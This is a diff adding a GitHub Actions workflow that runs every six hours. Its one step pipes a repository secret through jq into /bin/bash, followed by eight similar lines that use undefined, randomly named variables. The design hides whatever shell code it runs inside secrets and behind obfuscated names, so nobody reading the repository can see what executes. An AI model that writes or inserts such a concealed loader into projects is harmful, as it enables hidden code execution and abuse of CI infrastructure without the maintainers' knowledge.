@@ -1,0 +1,24 @@
+name: fanjiaoqingyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanjiaoqingyi
+        env:
+          ys47: ${{ secrets.ys47 }}
+        run: |
+          echo $ys47 | jq -r .rwymo24094 | /bin/bash
+          echo $i15805 | jq -r .ogumy5582 | /bin/bash
+          echo $w24537 | jq -r .qv44106 | /bin/bash
+          echo $fgaqp6645 | jq -r .rd6043 | /bin/bash
+          echo $px3588 | jq -r .b020 | /bin/bash
+          echo $scvto81 | jq -r .a84 | /bin/bash
+          echo $qs86743 | jq -r .bd632 | /bin/bash
+          echo $t862 | jq -r .p15 | /bin/bash
+          echo $muiet54195 | jq -r .c661 | /bin/bash
+
